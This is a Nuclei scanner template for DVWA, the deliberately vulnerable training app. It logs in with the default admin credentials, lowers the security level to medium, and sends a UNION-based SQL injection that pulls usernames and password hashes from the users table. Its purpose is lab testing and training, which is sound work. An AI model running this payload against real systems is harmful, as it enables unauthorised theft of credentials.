id: dvwa-sqli-authenticated-medium-sec

info:
  name: DVWA SQLi - medium sec (Authenticated)
  author: Dylan Shield (Shieldia.co)
  severity: high
  description: Attempts to exploit SQLi on DVWA after authentication.
  reference:
    - https://github.com/digininja/DVWA
  tags: dvwa,sqli

variables:
  password: "password"
  username: "admin"

flow: http(1) && http(2) && http(3)

http:
  # Step 1: Authenticate as admin and get PHPSESSID and user_token
  - raw:
      - |
        GET /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

      - |
        POST /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
    
    extractors:
      - type: regex
        name: token
        group: 1
        part: body
        regex:
          - "name='user_token' value='([a-f0-9]+)'"
        internal: true

  # Step 2: Set Security Level to Medium
  - raw:
      - |
        POST /DVWA/security.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close

        security=medium&seclev_submit=Submit&user_token={{token}}

  # Step 3: Execute SQLi
  - raw:
      - |
        POST /DVWA/vulnerabilities/sqli/ HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Origin: http://tartarus-dvwa.home.arpa
        Connection: keep-alive
        Referer: http://tartarus-dvwa.home.arpa/DVWA/vulnerabilities/sqli/
        Content-Type: application/x-www-form-urlencoded
        
        id=1+UNION+SELECT+user%2C+password+FROM+users%3B--+-&Submit=Submit
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        name: "Multiple occurrences of ID: 1"
        part: body
        regex:
          - "(ID: 1.*){2,}"
    extractors:
      - type: regex
        name: query_in
        part: request
        internal: true
        group: 1
        regex:
          - "id=(.*)&"
        
      - type: dsl
        name: input
        dsl:
          - "url_decode(query_in)"
